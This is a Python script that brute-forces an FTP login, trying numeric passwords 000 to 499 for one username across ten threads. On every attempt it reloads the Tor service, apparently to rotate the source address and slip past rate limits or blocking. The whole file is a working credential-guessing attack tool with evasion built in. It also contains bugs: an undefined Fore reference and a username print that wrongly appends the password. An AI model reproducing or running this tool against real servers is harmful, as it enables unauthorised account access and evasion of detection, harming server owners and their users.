import ftplib
from threading import Thread
import queue
import os

HOST, PORT = "localhost", 21

q = queue.Queue()
n_threads = 10

USERNAME = "username"

flag = True
to_brute_force = ["{0:03}".format(i) for i in range(500)]

def execute():

    global q
    
    while True:
        os.system("service tor reload")
        index = q.get()
        server = ftplib.FTP()
        print("[!] Trying " +  str(index))
    
        try:
            server.connect(HOST, PORT, timeout=5)
            server.login(USERNAME, str(index))
    
        except ftplib.error_perm:
            pass
    
        else:
            print("[+] Found credentials: ")
            print(f"\tUser: {USERNAME}"+ str(index))
            print(f"\tPassword: {str(index)}{Fore.RESET}")
            
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0

        finally:
            q.task_done()


for i in to_brute_force:
    q.put(i)

for t in range(n_threads):
    thread = Thread(target=execute)
    thread.daemon = True
    thread.start()

q.join()